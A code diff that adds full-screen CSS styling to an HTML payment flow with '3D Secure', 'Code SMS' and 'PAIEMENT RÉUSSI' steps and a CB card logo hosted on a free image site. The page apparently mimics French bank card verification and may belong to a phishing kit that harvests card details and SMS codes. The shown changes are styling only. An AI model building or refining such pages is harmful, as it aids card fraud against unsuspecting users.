@@ -27,6 +27,19 @@
       text-align: center;
     }
 
+    .full-width-container {
+      width: 100%;
+      max-width: 100%;
+      margin: 0;
+      border-radius: 0;
+      box-shadow: none;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
     h2 {
       color: #333;
       margin-bottom: 20px;
@@ -125,6 +138,24 @@
       input[type="submit"] {
         font-size: 16px;
       }
+
+      .full-width-container {
+        padding: 10px;
+      }
+
+      .full-width-container h2 {
+        font-size: 24px;
+      }
+
+      .full-width-container p {
+        font-size: 16px;
+      }
+
+      .full-width-container input[type="text"],
+      .full-width-container input[type="submit"] {
+        width: 90%;
+        margin: 10px auto;
+      }
     }
   </style>
 </head>
@@ -171,7 +202,7 @@
     </form>
   </div>
 
-  <div class="payment-container hidden" id="step-2">
+  <div class="payment-container full-width-container hidden" id="step-2">
     <h2>3D Secure</h2>
     <div class="icon-container">
       <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
@@ -182,7 +213,7 @@
     <p>VEUILLEZ PATIENTER...</p>
   </div>
 
-  <div class="payment-container hidden" id="step-3">
+  <div class="payment-container full-width-container hidden" id="step-3">
     <h2>Code SMS</h2>
     <div class="icon-container">
       <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
@@ -196,7 +227,7 @@
     </form>
   </div>
 
-  <div class="payment-container hidden" id="step-4">
+  <div class="payment-container full-width-container hidden" id="step-4">
     <h2>3D Secure</h2>
     <div class="icon-container">
       <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
@@ -207,7 +238,7 @@
     <p>VEUILLEZ PATIENTER...</p>
   </div>
 
-  <div class="payment-container hidden" id="step-5">
+  <div class="payment-container full-width-container hidden" id="step-5">
     <h2>PAIEMENT RÉUSSI</h2>
     <div class="icon-container">
       <img src="https://i.ibb.co/nkyQTHm/t-l-c.jpg" alt="CB">
